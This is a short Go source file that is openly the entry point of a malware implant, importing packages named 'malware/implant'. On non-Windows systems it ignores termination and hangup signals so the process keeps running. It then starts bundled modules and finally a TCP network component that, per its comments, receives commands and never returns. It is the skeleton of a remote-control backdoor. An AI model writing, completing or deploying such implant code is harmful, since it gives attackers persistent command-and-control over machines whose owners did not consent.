package main

import (
	"malware/implant/basic_tcp_network"
	"malware/implant/included_modules"
	"os/signal"
	"runtime"
	"syscall"
)

func main() {
	if runtime.GOOS != "windows" { // Windows doesnt kill children on parent death
		signal.Ignore(syscall.SIGQUIT)
		signal.Ignore(syscall.SIGINT)
		signal.Ignore(syscall.SIGHUP)
	}

	for _, module := range included_modules.Modules {
		module.Init()
	}

	network := basic_tcp_network.Create() // Network is always last to init (Can't get commands until other modules started)
	network.Init()                        // Shouldn't return
}
